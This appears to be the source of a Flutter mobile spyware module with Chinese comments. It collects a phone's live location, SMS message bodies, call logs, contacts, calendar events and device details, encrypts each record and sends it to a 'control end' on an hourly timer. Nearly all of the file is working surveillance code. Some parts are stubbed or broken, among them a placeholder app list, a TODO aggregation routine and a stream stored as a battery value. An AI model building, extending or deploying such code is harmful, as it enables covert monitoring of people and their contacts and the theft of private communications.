// 数据收集器 - 负责收集用户手机上的各种数据
import 'dart:async';
import 'dart:convert';
import 'package:flutter/material.dart';
import 'package:permission_handler/permission_handler.dart';
import 'package:location/location.dart';
import 'package:contacts_service/contacts_service.dart';
import 'package:sms_maintained/sms_maintained.dart';
import 'package:call_log/call_log.dart';
import 'package:calendar_events/calendar_events.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:device_info_plus/device_info_plus.dart';
import 'package:package_info_plus/package_info_plus.dart';
import 'package:path_provider/path_provider.dart';
import 'package:encrypt/encrypt.dart' as encrypt;
import 'package:shared_preferences/shared_preferences.dart';
import '../connectivity/connection_manager.dart';

class DataCollector {
  static final DataCollector _instance = DataCollector._internal();
  factory DataCollector() => _instance;
  DataCollector._internal();
  
  final ConnectionManager _connectionManager = ConnectionManager();
  late SharedPreferences _prefs;
  
  // 加密密钥（实际应用中应该从安全存储获取）
  final String _encryptionKey = 'your-32-byte-encryption-key-here';
  
  Future<void> initialize() async {
    _prefs = await SharedPreferences.getInstance();
  }
  
  Future<void> startAllCollections() async {
    // 启动所有数据收集任务
    _startLocationCollection();
    _startAppUsageCollection();
    _startCallLogCollection();
    _startSmsCollection();
    _startCalendarCollection();
    _startContactsCollection();
    _startBatteryCollection();
    _startNetworkCollection();
    
    // 定期发送汇总数据到控制端
    Timer.periodic(const Duration(hours: 1), (timer) {
      _sendAggregatedData();
    });
  }
  
  // 位置数据收集
  void _startLocationCollection() async {
    final locationPermission = await Permission.location.request();
    if (locationPermission.isGranted) {
      final Location location = Location();
      location.onLocationChanged.listen((LocationData currentLocation) {
        final locationData = {
          'timestamp': DateTime.now().toIso8601String(),
          'latitude': currentLocation.latitude,
          'longitude': currentLocation.longitude,
          'accuracy': currentLocation.accuracy,
          'speed': currentLocation.speed,
        };
        _sendEncryptedData('location', locationData);
      });
    }
  }
  
  // 应用使用数据收集
  void _startAppUsageCollection() async {
    // 获取设备信息和应用列表
    final deviceInfo = DeviceInfoPlugin();
    final packageInfo = await PackageInfo.fromPlatform();
    
    final appUsageData = {
      'timestamp': DateTime.now().toIso8601String(),
      'deviceModel': await _getDeviceModel(deviceInfo),
      'installedApps': await _getInstalledApps(),
      'currentApp': packageInfo.appName,
    };
    
    _sendEncryptedData('app_usage', appUsageData);
    
    // 定期更新应用使用情况
    Timer.periodic(const Duration(minutes: 30), (timer) {
      // TODO: 实现更详细的应用使用跟踪
    });
  }
  
  // 通话记录收集
  void _startCallLogCollection() async {
    final callLogPermission = await Permission.phone.request();
    if (callLogPermission.isGranted) {
      final Iterable<CallLogEntry> callLogEntries = await CallLog.query();
      final callLogData = callLogEntries.map((entry) {
        return {
          'timestamp': entry.timestamp,
          'phoneNumber': entry.number,
          'callType': entry.callType,
          'duration': entry.duration,
        };
      }).toList();
      
      _sendEncryptedData('call_log', {
        'timestamp': DateTime.now().toIso8601String(),
        'entries': callLogData,
      });
    }
  }
  
  // SMS消息收集
  void _startSmsCollection() async {
    final smsPermission = await Permission.sms.request();
    if (smsPermission.isGranted) {
      final List<SmsMessage> messages = await SmsQuery.queryLastMessage();
      final smsData = messages.map((message) {
        return {
          'timestamp': message.date,
          'phoneNumber': message.address,
          'body': message.body,
          'type': message.type,
        };
      }).toList();
      
      _sendEncryptedData('sms', {
        'timestamp': DateTime.now().toIso8601String(),
        'messages': smsData,
      });
    }
  }
  
  // 日历事件收集
  void _startCalendarCollection() async {
    final calendarPermission = await Permission.calendar.request();
    if (calendarPermission.isGranted) {
      final CalendarEvents calendar = CalendarEvents();
      final events = await calendar.retrieveEvents(
        DateTime.now().subtract(const Duration(days: 7)),
        DateTime.now().add(const Duration(days: 7)),
      );
      
      final calendarData = events.map((event) {
        return {
          'title': event.title,
          'startTime': event.startTime?.toIso8601String(),
          'endTime': event.endTime?.toIso8601String(),
          'location': event.location,
          'isAllDay': event.isAllDay,
        };
      }).toList();
      
      _sendEncryptedData('calendar', {
        'timestamp': DateTime.now().toIso8601String(),
        'events': calendarData,
      });
    }
  }
  
  // 联系人收集
  void _startContactsCollection() async {
    final contactsPermission = await Permission.contacts.request();
    if (contactsPermission.isGranted) {
      final Iterable<Contact> contacts = await ContactsService.getContacts();
      final contactsData = contacts.map((contact) {
        return {
          'displayName': contact.displayName,
          'phones': contact.phones?.map((phone) => phone.value).toList(),
          'emails': contact.emails?.map((email) => email.value).toList(),
        };
      }).toList();
      
      _sendEncryptedData('contacts', {
        'timestamp': DateTime.now().toIso8601String(),
        'contacts': contactsData,
      });
    }
  }
  
  // 电池使用收集
  void _startBatteryCollection() {
    Battery().batteryLevelStream.listen((level) {
      final batteryData = {
        'timestamp': DateTime.now().toIso8601String(),
        'level': level,
        'charging': Battery().onBatteryStateChanged,
      };
      _sendEncryptedData('battery', batteryData);
    });
  }
  
  // 网络活动收集
  void _startNetworkCollection() {
    Connectivity().onConnectivityChanged.listen((ConnectivityResult result) {
      final networkData = {
        'timestamp': DateTime.now().toIso8601String(),
        'connectionType': result.toString(),
      };
      _sendEncryptedData('network', networkData);
    });
  }
  
  // 发送加密数据到控制端
  void _sendEncryptedData(String dataType, dynamic data) {
    try {
      final jsonString = jsonEncode(data);
      final encryptedData = _encryptData(jsonString);
      
      final payload = {
        'type': dataType,
        'data': encryptedData,
        'timestamp': DateTime.now().toIso8601String(),
      };
      
      _connectionManager.sendMessage(payload);
    } catch (e) {
      // 记录错误但不中断其他收集
      debugPrint('Failed to send $dataType data: $e');
    }
  }
  
  // 发送汇总数据（每小时一次）
  void _sendAggregatedData() {
    // 汇总过去一小时的数据模式
    final aggregatedData = {
      'timestamp': DateTime.now().toIso8601String(),
      'summary': 'Hourly data aggregation placeholder',
      // TODO: 实现实际的数据聚合逻辑
    };
    
    _sendEncryptedData('aggregated', aggregatedData);
  }
  
  // 数据加密
  String _encryptData(String plainText) {
    final key = encrypt.Key.fromUtf8(_encryptionKey);
    final iv = encrypt.IV.fromLength(16);
    final encrypter = encrypt.Encrypter(encrypt.AES(key));
    final encrypted = encrypter.encrypt(plainText, iv: iv);
    return encrypted.base64;
  }
  
  // 辅助方法
  Future<String> _getDeviceModel(DeviceInfoPlugin deviceInfo) async {
    if (defaultTargetPlatform == TargetPlatform.android) {
      final androidInfo = await deviceInfo.androidInfo;
      return '${androidInfo.manufacturer} ${androidInfo.model}';
    } else if (defaultTargetPlatform == TargetPlatform.iOS) {
      final iosInfo = await deviceInfo.iosInfo;
      return iosInfo.utsname.machine;
    }
    return 'Unknown';
  }
  
  Future<List<String>> _getInstalledApps() async {
    // Flutter无法直接获取已安装应用列表，需要原生实现
    // 这里返回一个占位符
    return ['com.example.app1', 'com.example.app2'];
  }
}